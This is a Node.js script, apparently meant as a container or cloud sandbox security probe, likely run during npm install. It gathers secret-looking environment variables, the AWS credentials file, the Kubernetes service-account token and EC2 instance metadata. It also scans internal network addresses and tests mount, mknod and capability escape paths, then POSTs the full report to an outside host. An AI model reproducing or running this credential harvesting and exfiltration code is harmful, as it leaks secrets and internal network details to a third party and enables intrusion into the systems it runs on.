import http from "http";
import https from "https";
import fs from "fs";
import { execSync } from "child_process";
import os from "os";

const METADATA_HOST = "169.254.169.254";
const REPORT_HOST = "idms-reporting.mycrocloud.site";
const REPORT_PATH = "/api/report";

function request({ protocol = "http:", timeout = 3000, ...options }, body = null) {
  const lib = protocol === "https:" ? https : http;

  return new Promise((resolve) => {
    const req = lib.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () =>
        resolve({
          ok: true,
          statusCode: res.statusCode,
          body: data.slice(0, 1000),
        })
      );
    });

    req.on("error", (err) =>
      resolve({
        ok: false,
        error: err.message,
      })
    );

    req.setTimeout(timeout, () => {
      req.destroy(new Error("Request timeout"));
    });

    if (body) req.write(body);
    req.end();
  });
}

function safeRead(path) {
  try {
    return fs.readFileSync(path, "utf8").slice(0, 1000);
  } catch {
    return null;
  }
}

async function scanInternalNetwork() {
  const targets = [
    "10.0.0.1",
    "10.0.0.2",
    "172.16.0.1",
    "192.168.1.1",
    "kubernetes.default.svc",
  ];

  const results = {};

  for (const host of targets) {
    const res = await request({
      protocol: "http:",
      host,
      path: "/",
      method: "GET",
      timeout: 2000,
    });

    results[host] = res.ok ? res.statusCode : res.error;
  }

  return results;
}

function getMountInfo() {
  try {
    return fs.readFileSync("/proc/self/mountinfo", "utf8")
      .split("\n")
      .slice(0, 50); // giới hạn output
  } catch {
    return null;
  }
}

async function run() {
  const report = {
    timestamp: new Date().toISOString(),
    platform: {
      hostname: os.hostname(),
      platform: process.platform,
      arch: process.arch,
      nodeVersion: process.version,
    },

    // ---- Privilege info ----
    userInfo: {
      uid: process.getuid?.(),
      gid: process.getgid?.(),
    },

    shellAccess: null,

    // ---- Secret exposure ----
    envLeak: null,
    awsCredentialsFile: null,

    // ---- Container breakout ----
    dockerSockExists: false,
    proc1Cgroup: null,

    // ---- Kubernetes ----
    k8sToken: null,

    // ---- Network ----
    metadata: null,
    metadataError: null,
    internalScan: null,
    internetAccess: null,

    // ---- Reporting ----
    reportPostStatus: null,
  };

  // 1️⃣ Test shell
  try {
    report.shellAccess = execSync("whoami").toString().trim();
  } catch {
    report.shellAccess = "blocked";
  }

  // 2️⃣ Check ENV secrets
  report.envLeak = Object.fromEntries(
    Object.entries(process.env)
      .filter(([k]) =>
        /(AWS|KEY|SECRET|TOKEN|PASS|DB|DATABASE)/i.test(k)
      )
      .slice(0, 15)
  );

  // 3️⃣ File system checks
  report.awsCredentialsFile = safeRead("/root/.aws/credentials");
  report.dockerSockExists = fs.existsSync("/var/run/docker.sock");
  report.proc1Cgroup = safeRead("/proc/1/cgroup");
  report.k8sToken = safeRead(
    "/var/run/secrets/kubernetes.io/serviceaccount/token"
  );

  // 4️⃣ Test IMDS (metadata)
  const tokenRes = await request({
    protocol: "http:",
    host: METADATA_HOST,
    path: "/latest/api/token",
    method: "PUT",
    headers: {
      "X-aws-ec2-metadata-token-ttl-seconds": "60",
    },
  });

  if (tokenRes.ok && tokenRes.statusCode === 200) {
    const metaRes = await request({
      protocol: "http:",
      host: METADATA_HOST,
      path: "/latest/meta-data/",
      method: "GET",
      headers: {
        "X-aws-ec2-metadata-token": tokenRes.body,
      },
    });

    report.metadata = metaRes.ok ? metaRes.body : metaRes.error;
  } else {
    report.metadataError =
      tokenRes.error || `Status ${tokenRes.statusCode}`;
  }

  // 5️⃣ Internal network scan
  report.internalScan = await scanInternalNetwork();

  // 6️⃣ Internet test (allowed for npm install)
  report.internetAccess = await request({
    protocol: "https:",
    host: "registry.npmjs.org",
    path: "/",
    method: "GET",
  });

  report.mountInfo = getMountInfo();
  report.sensitivePaths = {
    hostRootExists: fs.existsSync("/host"),
    rootfsExists: fs.existsSync("/rootfs"),
    dockerSock: fs.existsSync("/var/run/docker.sock"),
  };

  function getCapabilities() {
    try {
      const status = fs.readFileSync("/proc/self/status", "utf8");
      const capLine = status.split("\n").find(l => l.startsWith("CapEff"));
      return capLine || null;
    } catch {
      return null;
    }
  }

  report.capabilities = getCapabilities();

  function getNamespaceInfo() {
    try {
      return fs.readdirSync("/proc/self/ns");
    } catch {
      return null;
    }
  }

  report.namespaces = getNamespaceInfo();

  try {
    execSync("mkdir -p /tmp/testmount && mount -t tmpfs tmpfs /tmp/testmount");
    report.canMount = true;
  } catch {
    report.canMount = false;
  }

  try {
    execSync("mknod /tmp/testnull c 1 3");
    report.canMknod = true;
  } catch {
    report.canMknod = false;
  }

  report.seccomp = safeRead("/proc/self/status")
    ?.split("\n")
    .find(l => l.startsWith("Seccomp"));

  // 7️⃣ Always POST report (even if everything failed)
  try {
    const postRes = await request(
      {
        protocol: "https:",
        host: REPORT_HOST,
        path: REPORT_PATH,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
      },
      JSON.stringify(report)
    );

    report.reportPostStatus = postRes.statusCode || postRes.error;
  } catch (err) {
    report.reportPostStatus = err.message;
  }

  console.log("==== SECURITY TEST RESULT ====");
  console.log(JSON.stringify(report, null, 2));
}

run();